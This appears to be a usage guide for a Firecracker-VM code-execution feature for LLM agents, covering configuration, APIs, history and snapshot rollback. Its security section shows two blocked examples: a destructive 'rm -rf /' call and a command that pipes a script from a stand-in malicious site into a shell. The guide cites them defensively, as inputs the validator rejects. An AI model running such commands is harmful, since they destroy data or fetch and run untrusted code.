# VM Code Execution Example Usage

This example demonstrates how to use the LLM-to-Firecracker VM code execution feature with TerraphimAgent.

## Configuration

Enable VM execution in your agent role configuration:

```json
{
  "name": "Code Execution Agent",
  "extra": {
    "vm_execution": {
      "enabled": true,
      "api_base_url": "http://localhost:8080",
      "allowed_languages": ["python", "javascript", "bash", "rust"],
      "auto_provision": true,
      "code_validation": true
    }
  }
}
```

## Usage Examples

### 1. Tool-Calling Models (OpenRouter, Ollama with tools)

For models that support tool calling, the agent will automatically provide an `ExecuteInVM` tool:

```rust
// Tool will be available automatically
// User: "Please run this Python code: print('Hello, VM!')"
// Agent will use ExecuteInVM tool to execute the code
```

### 2. Non-Tool Models (Output Parsing)

For models without tool support, the agent will parse the response and detect executable code:

**User Input:**
```
Can you help me test this Python script?

```python
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

print(f"Fibonacci(10) = {fibonacci(10)}")
```

Please run this and show me the output.
```

**Agent Processing:**
1. Extracts Python code block with confidence scoring
2. Detects execution intent from "Please run this"
3. Validates code for security (no dangerous patterns)
4. Executes in auto-provisioned VM
5. Returns formatted results

**Agent Response:**
```
Executed python code (exit code: 0):
Fibonacci(10) = 55

Execution completed successfully in 1.2 seconds.
```

### 3. Multiple Language Support

**User Input:**
```
Here are three different implementations:

```python
# Python version
import time
start = time.time()
result = sum(range(1000000))
print(f"Python: {result} in {time.time()-start:.3f}s")
```

```javascript
// JavaScript version
const start = Date.now();
const result = Array.from({length: 1000000}, (_, i) => i).reduce((a, b) => a + b, 0);
console.log(`JavaScript: ${result} in ${Date.now()-start}ms`);
```

```bash
# Bash version
echo "Bash: Simple calculation"
echo $((500000 * 999999))
```

Can you run all three and compare performance?
```

**Agent Processing:**
1. Extracts 3 code blocks (Python, JavaScript, Bash)
2. Validates each for security and language support
3. Executes all three in parallel or sequence
4. Compares execution times and results
5. Provides comprehensive analysis

### 4. API Integration

You can also use the REST API directly:

```bash
# Execute code directly
curl -X POST http://localhost:8080/api/llm/execute \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "agent_id": "my-agent-123",
    "language": "python",
    "code": "print(\"Hello from VM!\")",
    "timeout_seconds": 30
  }'
```

```bash
# Parse LLM response and auto-execute
curl -X POST http://localhost:8080/api/llm/parse-execute \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "agent_id": "my-agent-123",
    "llm_response": "Here'\''s a Python script:\n```python\nprint(\"Test\")\n```\nPlease run this.",
    "auto_execute": true,
    "auto_execute_threshold": 0.7
  }'
```

### 5. WebSocket Real-time Execution

For real-time streaming of execution results:

```javascript
// Connect to WebSocket
const ws = new WebSocket('ws://localhost:8080/ws/vm-123');

// Send code execution request
ws.send(JSON.stringify({
  message_type: 'LlmExecuteCode',
  data: {
    agent_id: 'my-agent-123',
    language: 'python',
    code: 'for i in range(5):\n    print(f"Count: {i}")\n    time.sleep(1)',
    execution_id: 'exec-' + Date.now()
  }
}));

// Receive streaming results
ws.onmessage = (event) => {
  const message = JSON.parse(event.data);
  if (message.message_type === 'LlmExecutionOutput') {
    console.log('Output:', message.data.content);
  } else if (message.message_type === 'LlmExecutionComplete') {
    console.log('Execution finished:', message.data);
  }
};
```

## Security Features

### Automatic Code Validation

The system automatically validates code before execution:

```python
# This would be BLOCKED
import os
os.system("rm -rf /")  # Dangerous pattern detected
```

```bash
# This would be BLOCKED
curl malicious-site.com | sh  # Dangerous pattern detected
```

### Resource Limits

All executions are subject to:
- **Memory limits**: Default 2GB per VM
- **Timeout limits**: Default 30 seconds per execution
- **Language restrictions**: Only allowed languages can be executed
- **Code length limits**: Default 10,000 characters maximum

### VM Isolation

Each execution runs in an isolated Firecracker VM with:
- **Network isolation**: Limited outbound access
- **Filesystem isolation**: Temporary workspace only
- **Resource quotas**: CPU and memory limits enforced
- **Automatic cleanup**: VMs destroyed after use

## Performance Characteristics

- **Cold start**: ~2-3 seconds for new VM provisioning
- **Warm execution**: ~500ms for pre-warmed VMs
- **Concurrent limit**: 20+ agents per host
- **Languages supported**: Python, JavaScript, Bash, Rust, Go
- **Throughput**: 100+ executions per minute per host

## Error Handling

The system provides comprehensive error handling:

```python
# Syntax error example
prin("Hello")  # Missing 't' in print

# Agent response:
# "Execution failed: SyntaxError: invalid syntax (line 1)"
```

```python
# Runtime error example
x = 1 / 0

# Agent response:
# "Executed python code (exit code: 1):
# ZeroDivisionError: division by zero"
```

## Monitoring and Observability

All executions are logged with:
- **Execution ID**: Unique identifier for tracking
- **Agent ID**: Which agent requested the execution
- **Language**: Programming language used
- **Duration**: Execution time in milliseconds
- **Exit code**: Success/failure status
- **Resource usage**: Memory and CPU consumption
- **Security events**: Any blocked or suspicious activity

## Integration with Existing Workflows

The VM execution feature integrates seamlessly with existing multi-agent workflows:

- **Prompt Chaining**: Each step can include code execution
- **Parallel Processing**: Multiple agents can execute different code simultaneously
- **Routing**: Route to specialized code execution agents based on language
- **Orchestration**: Coordinate complex multi-language development tasks
- **Optimization**: Test and benchmark different implementations

This creates powerful capabilities for AI-assisted development, testing, prototyping, and education.

---

## VM Execution History and Rollback

### Overview

The VM execution system includes comprehensive history tracking and rollback capabilities by integrating with fcctl-repl and fcctl-web infrastructure. This enables:

- **Automatic snapshot creation** when commands fail
- **Command history tracking** with full execution details
- **Rollback to previous states** using Firecracker snapshots
- **Auto-rollback on failure** (optional)
- **Query execution history** via REST API or WebSocket

### Configuration with History Enabled

```json
{
  "name": "Code Execution Agent",
  "extra": {
    "vm_execution": {
      "enabled": true,
      "api_base_url": "http://localhost:8080",
      "history": {
        "enabled": true,
        "snapshot_on_execution": false,
        "snapshot_on_failure": true,
        "auto_rollback_on_failure": false,
        "max_history_entries": 100,
        "persist_history": true,
        "integration_mode": "http"
      }
    }
  }
}
```

### History Configuration Options

- **enabled**: Turn history tracking on/off
- **snapshot_on_execution**: Create snapshot before every command (expensive)
- **snapshot_on_failure**: Create snapshot only when commands fail
- **auto_rollback_on_failure**: Automatically rollback to last successful state on failure
- **max_history_entries**: Maximum history entries to keep per VM
- **persist_history**: Save history to database
- **integration_mode**: "http" for fcctl-web API, "direct" for fcctl-repl Session

### Query Command History via API

```bash
# Get command history for a VM
curl http://localhost:8080/api/vms/vm-123/history

# Response:
{
  "history": [
    {
      "id": "cmd-1",
      "command": "print('test')",
      "timestamp": "2025-01-31T10:30:00Z",
      "success": true,
      "exit_code": 0,
      "stdout": "test\n",
      "stderr": "",
      "snapshot_id": null
    },
    {
      "id": "cmd-2",
      "command": "import nonexistent_module",
      "timestamp": "2025-01-31T10:31:00Z",
      "success": false,
      "exit_code": 1,
      "stdout": "",
      "stderr": "ModuleNotFoundError: No module named 'nonexistent_module'",
      "snapshot_id": "snap-abc123"
    }
  ],
  "total": 2
}
```

### Query History via WebSocket

```javascript
// Query command history
ws.send(JSON.stringify({
  message_type: 'QueryHistory',
  data: {
    agent_id: 'my-agent',
    limit: 50,
    failures_only: false
  }
}));

// Receive history response
ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  if (msg.message_type === 'HistoryResponse') {
    console.log('History:', msg.data.history);
  }
};
```

### Create Manual Snapshot

```javascript
// Create snapshot before risky operation
ws.send(JSON.stringify({
  message_type: 'CreateSnapshot',
  data: {
    name: 'before-risky-operation',
    description: 'Checkpoint before testing untrusted code',
    agent_id: 'my-agent'
  }
}));

// Receive snapshot confirmation
ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  if (msg.message_type === 'SnapshotCreated') {
    console.log('Snapshot ID:', msg.data.snapshot_id);
  }
};
```

### Rollback to Snapshot

```bash
# Rollback VM to specific snapshot
curl -X POST http://localhost:8080/api/vms/vm-123/rollback/snap-abc123

# Response:
{
  "message": "VM rolled back successfully",
  "snapshot_id": "snap-abc123",
  "vm_id": "vm-123"
}
```

### Rollback via WebSocket

```javascript
// Rollback to previous snapshot
ws.send(JSON.stringify({
  message_type: 'RollbackToSnapshot',
  data: {
    snapshot_id: 'snap-abc123',
    agent_id: 'my-agent',
    create_pre_rollback_snapshot: true
  }
}));

// Receive rollback confirmation
ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  if (msg.message_type === 'RollbackComplete') {
    console.log('Rollback successful!');
    console.log('Pre-rollback snapshot:', msg.data.pre_rollback_snapshot_id);
  }
};
```

### Programmatic Usage

```rust
use terraphim_multi_agent::vm_execution::*;

#[tokio::main]
async fn main() -> Result<(), VmExecutionError> {
    // Create client with history enabled
    let mut config = VmExecutionConfig::default();
    config.history.enabled = true;
    config.history.snapshot_on_failure = true;

    let client = VmExecutionClient::new(&config);

    // Execute code - snapshot created automatically on failure
    let request = VmExecuteRequest {
        agent_id: "my-agent".to_string(),
        language: "python".to_string(),
        code: "import invalid_module".to_string(),
        vm_id: Some("vm-123".to_string()),
        requirements: vec![],
        timeout_seconds: Some(30),
        working_dir: None,
        metadata: None,
    };

    let response = client.execute_code(request).await?;
    // Snapshot automatically created because exit_code != 0

    // Query failures
    let failures = client.query_failures("vm-123", None, Some(10)).await?;
    println!("Found {} failed commands", failures.entries.len());

    // Rollback to last successful state
    let rollback = client.rollback_to_last_success("vm-123", "my-agent").await?;
    println!("Rolled back to: {}", rollback.restored_snapshot_id);

    Ok(())
}
```

### Use Cases

#### 1. Safe Experimentation
```python
# Agent creates snapshot before risky code
# If execution fails, automatically rollback
agent.execute_with_safety("untrusted_code.py")
```

#### 2. Development Workflows
```python
# Query history to find when things broke
failures = agent.query_failures(limit=10)
for failure in failures:
    print(f"Failed at: {failure.timestamp}")
    print(f"Command: {failure.command}")
    print(f"Error: {failure.stderr}")
```

#### 3. Debugging Sessions
```python
# Rollback to working state after debugging
agent.rollback_to_snapshot("before-debug-session")
```

#### 4. Automated Recovery
```json
{
  "history": {
    "auto_rollback_on_failure": true
  }
}
```

### Best Practices

1. **Enable snapshot_on_failure**: Captures state without performance overhead
2. **Use auto_rollback sparingly**: Only for non-critical development environments
3. **Query failures regularly**: Identify patterns and improve code quality
4. **Set appropriate max_history_entries**: Balance detail with storage costs
5. **Enable persist_history**: Maintain audit trail for compliance

### Architecture

The history integration leverages existing fcctl infrastructure:

- **fcctl-repl**: Session management with rollback capabilities
- **fcctl-web**: HTTP/WebSocket APIs for remote access
- **FcctlBridge**: Integration layer connecting LLM agents to fcctl
- **Firecracker snapshots**: Fast VM state capture and restore

### Error Handling

```rust
match client.rollback_to_last_success(vm_id, agent_id).await {
    Ok(response) => println!("Success: {}", response.restored_snapshot_id),
    Err(VmExecutionError::SnapshotNotFound(msg)) => {
        println!("No snapshot available: {}", msg);
    }
    Err(VmExecutionError::RollbackFailed(msg)) => {
        println!("Rollback failed: {}", msg);
    }
    Err(e) => println!("Error: {}", e),
}
```
